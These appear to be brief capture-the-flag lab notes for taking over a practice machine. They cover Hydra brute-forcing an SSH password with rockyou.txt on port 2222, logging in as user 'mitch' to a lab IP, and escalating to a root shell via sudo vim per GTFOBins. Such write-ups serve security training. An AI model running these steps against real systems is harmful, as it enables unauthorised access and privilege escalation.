##Hydra SSH Against Known username on port 2222

hydra $ip -s 2222 ssh -l <username> -P rockyou.txt

##ssh into victim (port 2222 running SSH is open)

ssh mitch@10.10.240.176 -p 2222

##using gtfobins to search for command for privilege escalation
## use sudo -l to check what can be run as root

vim -c ':!/bin/sh'
